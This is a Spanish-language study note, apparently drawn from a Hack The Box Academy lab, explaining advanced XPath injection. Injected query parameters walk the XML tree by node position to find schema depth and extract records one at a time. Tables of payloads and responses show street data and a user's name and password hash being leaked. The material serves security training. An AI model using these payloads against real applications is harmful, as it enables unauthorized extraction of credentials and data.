---
tags:
Fecha de actualización:
Nota previa:
Nota siguiente:
Area: "[[Inyección XPath]]"
---
---

A veces, es imposible extraer todo el documento XML a la vez. Considere una aplicación web que solo muestra la primera consulta XPath `five` resultados. Si inyectamos nuestra carga útil anterior de modo que la consulta devuelva el documento XML completo, solo podemos exfiltrar el primero `5` puntos de datos. Por lo tanto, necesitamos modificar nuestra carga útil para iterar manualmente a través de todo el documento XML para exfiltrar todos los datos.

---

# Exfiltración avanzada de datos
Para esta sección, estamos trabajando en una versión ligeramente modificada de la aplicación web de la sección anterior que limita la cantidad de resultados devueltos para que no podamos exfiltrar todo el documento XML a la vez. Para iterar a través del esquema XML, primero debemos determinar la profundidad del esquema. Podemos lograr esto asegurándonos de que la consulta XPath original no devuelva resultados y agregando una nueva consulta que nos brinde información sobre la profundidad del esquema. Establecemos el término de búsqueda en el parámetro `q` a cualquier cosa que no devuelva datos, por ejemplo, `SOMETHINGINVALID`. Luego podemos configurar el parámetro `f` to `fullstreetname | /*[1]`. Esto da como resultado la siguiente consulta XPath:
```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
```

La subconsulta `/*[1]` comienza en la raíz del documento `/`, mueve un nodo hacia abajo en el árbol de nodos debido al comodín `*`, y selecciona el primer hijo debido al predicado `[1]`. De esta forma, esta subconsulta selecciona el primer hijo de la raíz del documento, el nodo del elemento raíz del documento. Dado que el nodo del elemento raíz del documento tiene varios nodos secundarios, es del tipo de datos `array` en PHP, lo cual podemos confirmar al analizar la respuesta. La aplicación web espera un `string` pero recibe un `array` y por lo tanto no puede imprimir los resultados, lo que da como resultado una respuesta vacía:
![Solicitud HTTP GET con consulta no válida, la respuesta muestra resultados vacíos.](https://academy.hackthebox.com/storage/modules/204/dataexfil_7.png)

Ahora podemos determinar la profundidad del esquema agregando iterativamente un valor adicional `/*[1]` a la subconsulta hasta que cambie el comportamiento de la aplicación web. Los resultados se ven así (el `q` El parámetro sigue siendo el mismo que el anterior para todas las solicitudes):

|Valor del `f` Obtener parámetro|Respuesta|
|---|---|
|`fullstreetname \| /*[1]`|Nada|
|`fullstreetname \| /*[1]/*[1]`|Nada|
|`fullstreetname \| /*[1]/*[1]/*[1]`|Nada|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]`|`01ST ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]/*[1]`|`No Results!`|

De los resultados anteriores, podemos deducir que la profundidad del esquema para los datos de la calle es `4`:
![Solicitud HTTP GET con consulta no válida, la respuesta muestra '01ST ST'.](https://academy.hackthebox.com/storage/modules/204/dataexfil_8.png)

Esto nos permite comenzar a exfiltrar datos aumentando la posición en el último predicado hasta que no se puedan recuperar más datos:

|Valor del `f` Obtener parámetro|Respuesta|
|---|---|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]`|`01ST ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[2]`|`01ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[3]`|`ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[4]`|`No Results!`|

Exfiltramos con éxito información sobre la primera calle del conjunto de datos. Los tres valores parecen ser los `long street name`, el `short street name`, y a `street type`. De esta forma podemos rellenar algunos de los marcadores de posición del esquema XML de la sección anterior. Sin embargo, recuerda que todavía no sabemos los nombres exactos de los nodos. Sólo estamos intentando crear una descripción general de la estructura del documento XML:
```xml
<a>
	<b>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</b>
</a>
```

Ahora podemos extraer información sobre la segunda calle en el conjunto de datos incrementando el predicado de posición penúltima en nuestra carga útil inyectada de la siguiente manera:

|Valor del `f` Obtener parámetro|Respuesta|
|---|---|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[1]`|`02ND AVE`|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[2]`|`02ND`|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[3]`|`AVE`|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[4]`|`No Results!`|

Podemos hacer esto hasta que tengamos información filtrada sobre todas las calles. Sin embargo, como no nos interesan las calles, veamos si el documento XML contiene otros conjuntos de datos. Incrementar el primer predicado de posición en la carga útil tiene poco sentido, ya que esta es la raíz del documento y los documentos XML válidos solo contienen una única raíz de documento. Sin embargo, podemos alterar el predicado de segunda posición para encontrar conjuntos de datos adicionales dentro del documento XML. Recuerde que debemos determinar nuevamente la profundidad del esquema, ya que puede diferir de la profundidad del conjunto de datos de calles. Para ilustrar esto, considere el siguiente documento XML de muestra:
```xml
<dataset>
	<streets>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</streets>
	<users>
		<group name="users">
			<user>
				<username>test</username>
				<password>test</password>
			</user>
		</group>
		<group name="admins">
			<user>
				<username>admin</username>
				<password>admin</password>
			</user>
		</group>
	</users>
</dataset>
```

Al consultar el documento XML anterior, el `street` Los nodos están en profundidad `3`: `/dataset/streets/street`. Sin embargo, el `user` Los nodos están en profundidad `4`: `/dataset/users/group/user`. Por tanto, la profundidad es diferente y debemos determinarla nuevamente para exfiltrar a los usuarios. Podemos determinar la profundidad utilizando los siguientes valores de parámetros. Dado que nos centramos en el segundo conjunto de datos del documento XML, debemos utilizarlo `/*[1]/*[2]` Como punto de partida:

|Valor del `f` Obtener parámetro|Respuesta|
|---|---|
|`fullstreetname \| /*[1]/*[2]`|Nada|
|`fullstreetname \| /*[1]/*[2]/*[1]`|Nada|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]`|Nada|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]`|`htb-stdnt`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]/*[1]`|`No Results!`|

Podemos ver que la profundidad del esquema es `5`. Además, parece que hemos exfiltrado un nombre de usuario. Al igual que hicimos con los datos de calles antes, podemos exfiltrar todos los datos del usuario incrementando el último predicado de posición:

|Valor del `f` Obtener parámetro|Respuesta|
|---|---|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]`|`htb-stdnt`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[2]`|`295362c2618a05ba3899904a6a3f5bc0`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[3]`|`HackTheBox Academy Student Account`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[4]`|`No Results!`|

A partir de los datos que exfiltramos, parece que hemos filtrado un objeto de usuario que consta de un `username`, `password hash`, y `description`. Ahora podemos incrementar iterativamente los índices de posición de derecha a izquierda, tal como lo hicimos con el conjunto de datos de calles para exfiltrar a todos los usuarios.

**Nota:** Para exfiltrar un documento XML completo, tiene sentido implementar un script simple que haga la exfiltración por nosotros.